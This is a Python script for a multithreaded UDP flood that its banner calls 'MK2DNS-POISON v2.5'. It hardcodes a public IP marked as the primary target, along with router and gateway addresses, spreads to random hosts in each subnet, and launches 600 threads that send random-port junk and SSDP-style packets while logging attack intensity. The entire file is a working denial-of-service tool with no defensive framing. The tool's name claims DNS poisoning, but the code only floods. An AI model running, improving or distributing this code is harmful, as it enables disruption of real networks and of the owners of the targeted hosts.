import socket
import threading
import time
import random
import ipaddress

# ==================== TARGET CONFIGURATION ====================
TARGETS = [
    "62.109.121.42",     # Primary target
    "192.168.1.1",       # Router
    "10.0.0.1",          # Gateway
    "172.16.0.1",        # Internal
]

# Generate subnet targets for each main target
def generate_subnet_targets(base_ip, count=8):
    """Generate random IPs in same subnet for distributed attack"""
    try:
        # Parse IP and generate similar subnet IPs
        ip = ipaddress.IPv4Address(base_ip)
        network = ipaddress.IPv4Network(f"{base_ip}/24", strict=False)
        
        subnet_targets = []
        for _ in range(count):
            # Generate random IP in same /24 subnet
            random_ip = str(network.network_address + random.randint(1, 254))
            subnet_targets.append(random_ip)
        return subnet_targets
    except:
        return [base_ip] * count

# Build target list with subnet targets
ALL_TARGETS = []
for target in TARGETS:
    ALL_TARGETS.extend(generate_subnet_targets(target, 8))
print(f"[+] LOADED {len(ALL_TARGETS)} TARGETS (4 MAIN + SUBNET SPREAD)")

# ==================== LAG OPTIMIZATION ENGINE ====================
class LagOptimizer:
    def __init__(self):
        self.socket_pools = {}
        self.packet_buffers = {}
        self.batch_sizes = {}
        
    def get_socket_pool(self, target_idx):
        """Get or create socket pool for target (reuse sockets)"""
        if target_idx not in self.socket_pools:
            pool = []
            for _ in range(4):  # 4 sockets per target for parallel sending
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
                    pool.append(sock)
                except:
                    pass
            self.socket_pools[target_idx] = pool
        return self.socket_pools[target_idx]
    
    def batch_send(self, target_idx, target_ip, payloads):
        """Send multiple packets in batch to reduce overhead"""
        pool = self.get_socket_pool(target_idx)
        if not pool:
            return 0
        
        sent = 0
        for payload in payloads:
            try:
                sock = random.choice(pool)
                port = random.randint(1, 65535)
                sock.sendto(payload, (target_ip, port))
                sent += 1
            except:
                pass
        return sent

# ==================== MK2 PAYLOAD FACTORY ====================
class MK2PayloadFactory:
    def __init__(self):
        self.cache = {}
        self.cache_size = 100
        
    def get_payloads(self, payload_type, count=5):
        """Get cached payloads to avoid generation overhead"""
        key = f"{payload_type}_{count}"
        if key not in self.cache:
            payloads = []
            for _ in range(count):
                if payload_type == "LED":
                    payloads.append(self._led_payload())
                elif payload_type == "CPU":
                    payloads.append(self._cpu_payload())
                elif payload_type == "MEM":
                    payloads.append(self._mem_payload())
                elif payload_type == "JAM":
                    payloads.append(self._jam_payload())
                else:
                    payloads.append(self._basic_payload())
            
            # Cache payloads
            if len(self.cache) < self.cache_size:
                self.cache[key] = payloads
        
        return self.cache.get(key, [self._basic_payload() for _ in range(count)])
    
    def _led_payload(self):
        return bytes([0x55] * 64 + [0xAA] * 64)
    
    def _cpu_payload(self):
        return b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' + random.randbytes(40)
    
    def _mem_payload(self):
        return random.randbytes(1024)
    
    def _jam_payload(self):
        return b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n' + random.randbytes(50)
    
    def _basic_payload(self):
        return random.randbytes(512)

# ==================== MK2 THREAD CONTROLLER ====================
class MK2QuadController:
    def __init__(self, total_threads=600):
        self.total_threads = total_threads
        self.optimizer = LagOptimizer()
        self.payload_factory = MK2PayloadFactory()
        
        # Distribute threads across 4 target groups (150 threads per group)
        self.threads_per_group = total_threads // 4
        self.active_threads = 0
        
        # Stats tracking
        self.stats = {
            'targets': {i: {'packets': 0, 'bytes': 0} for i in range(len(ALL_TARGETS))},
            'total_packets': 0,
            'total_bytes': 0,
        }
        self.stats_lock = threading.Lock()
    
    def start_quad_attack(self):
        print(f"[+] MK2 QUAD ATTACK INITIALIZING")
        print(f"[+] TOTAL THREADS: {self.total_threads}")
        print(f"[+] TARGET GROUPS: 4")
        print(f"[+] THREADS PER GROUP: {self.threads_per_group}")
        print(f"[+] SUBNET TARGETS: {len(ALL_TARGETS)} IPs")
        print("─" * 60)
        
        # Start threads for each target group
        for group in range(4):
            base_idx = group * (len(ALL_TARGETS) // 4)
            for thread_num in range(self.threads_per_group):
                t = threading.Thread(
                    target=self.attack_worker,
                    args=(group, thread_num, base_idx)
                )
                t.daemon = True
                t.start()
                self.active_threads += 1
        
        print(f"[+] ATTACK DEPLOYED: {self.active_threads} threads across 4 target groups")
    
    def attack_worker(self, group_id, worker_id, base_target_idx):
        """Worker thread optimized for low-lag high-throughput"""
        
        # Each worker focuses on subset of targets from its group
        targets_per_worker = 4
        start_idx = base_target_idx + (worker_id * targets_per_worker) % (len(ALL_TARGETS) // 4)
        worker_targets = []
        
        for i in range(targets_per_worker):
            idx = (start_idx + i) % len(ALL_TARGETS)
            worker_targets.append((idx, ALL_TARGETS[idx]))
        
        # Pre-load payload batches for this worker type
        payload_types = ['LED', 'CPU', 'MEM', 'JAM']
        worker_type = payload_types[group_id % len(payload_types)]
        payload_batches = self.payload_factory.get_payloads(worker_type, 10)
        
        while True:
            try:
                # Select target for this iteration
                target_idx, target_ip = random.choice(worker_targets)
                
                # Batch send multiple packets to same target (reduces overhead)
                batch_size = random.randint(3, 8)
                sent = self.optimizer.batch_send(
                    target_idx, 
                    target_ip, 
                    random.choices(payload_batches, k=batch_size)
                )
                
                # Update stats
                with self.stats_lock:
                    self.stats['targets'][target_idx]['packets'] += sent
                    self.stats['targets'][target_idx]['bytes'] += sent * 512  # avg size
                    self.stats['total_packets'] += sent
                    self.stats['total_bytes'] += sent * 512
                    
            except Exception as e:
                # Minimal error handling to avoid overhead
                pass

# ==================== ANONYMOUS MK2 LOGGING ====================
def mk2_log_header():
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║               MK2DNS-POISON v2.5 [QUAD ASSAULT]             ║")
    print("║                600 THREADS | 4 TARGET GROUPS                ║")
    print("╚══════════════════════════════════════════════════════════════╝")

def mk2_log_status(stats, elapsed):
    total_pps = int(stats['total_packets'] / elapsed) if elapsed > 0 else 0
    total_mbps = (stats['total_bytes'] * 8) / (elapsed * 1024 * 1024) if elapsed > 0 else 0
    
    # Calculate per-group stats
    group_size = len(ALL_TARGETS) // 4
    group_stats = []
    for group in range(4):
        group_packets = 0
        for i in range(group * group_size, (group + 1) * group_size):
            if i < len(ALL_TARGETS):
                group_packets += stats['targets'][i]['packets']
        group_pps = int(group_packets / elapsed) if elapsed > 0 else 0
        group_stats.append(group_pps)
    
    print(f"[{time.strftime('%H:%M:%S')}] SYSTEM: QUAD_ASSAULT_ACTIVE")
    print(f"├─ TOTAL PPS: {total_pps:,}/s")
    print(f"├─ BANDWIDTH: {total_mbps:.1f} Mbps")
    print(f"├─ GROUP 1: {group_stats[0]:,}/s")
    print(f"├─ GROUP 2: {group_stats[1]:,}/s")
    print(f"├─ GROUP 3: {group_stats[2]:,}/s")
    print(f"├─ GROUP 4: {group_stats[3]:,}/s")
    
    # Attack intensity
    intensity = "INITIALIZING"
    if total_pps > 100000:
        intensity = "MAXIMUM ANNIHILATION"
    elif total_pps > 60000:
        intensity = "CRITICAL OVERLOAD"
    elif total_pps > 30000:
        intensity = "HIGH INTENSITY"
    elif total_pps > 15000:
        intensity = "MODERATE PRESSURE"
    
    print(f"└─ INTENSITY: {intensity}")
    print("─" * 60)
    
    # Warnings
    if total_mbps > 500:
        print("[‼] BANDWIDTH CRITICAL - NETWORK SATURATION")
    if any(pps > 25000 for pps in group_stats):
        print("[!] MULTIPLE TARGETS UNDER HEAVY ASSAULT")

# ==================== MAIN EXECUTION ====================
mk2_log_header()

# Initialize controller
controller = MK2QuadController(total_threads=600)

# Start the quad assault
controller.start_quad_attack()

# Monitoring loop
last_log = time.time()
last_stats_snapshot = controller.stats.copy()

while True:
    time.sleep(3)  # Log every 3 seconds
    
    # Take snapshot of current stats
    with controller.stats_lock:
        current_stats = {
            'total_packets': controller.stats['total_packets'],
            'total_bytes': controller.stats['total_bytes'],
            'targets': {k: v.copy() for k, v in controller.stats['targets'].items()}
        }
        
        # Reset counters
        controller.stats['total_packets'] = 0
        controller.stats['total_bytes'] = 0
        for idx in controller.stats['targets']:
            controller.stats['targets'][idx] = {'packets': 0, 'bytes': 0}
    
    # Calculate elapsed and log
    current_time = time.time()
    elapsed = current_time - last_log
    
    # Log status
    mk2_log_status(current_stats, elapsed)
    
    # Update timing
    last_log = current_time
    last_stats_snapshot = current_stats
    
    # Periodic thread status (every 30 seconds)
    if int(current_time) % 30 == 0:
        print(f"[+] THREAD STATUS: {controller.active_threads} ACTIVE")
        print(f"[+] TARGET COVERAGE: {len(ALL_TARGETS)} IPs")
        print(f"[+] OPTIMIZATION: BATCH SENDING ACTIVE")
        print("─" * 60)
